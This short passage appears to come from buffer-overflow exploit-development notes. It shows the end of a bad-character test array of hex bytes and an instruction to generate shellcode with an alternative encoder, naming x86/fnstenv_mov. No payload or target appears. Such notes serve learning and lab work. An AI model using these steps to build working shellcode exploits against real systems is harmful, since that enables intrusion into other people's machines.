  `"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"`  
  `"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"`  
  `"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"`  
  `"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"`  
  `"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )`  

Generate shellcode (may need to use different encoder due to huge list of bad characters. x86/fnstenv_mov may help)
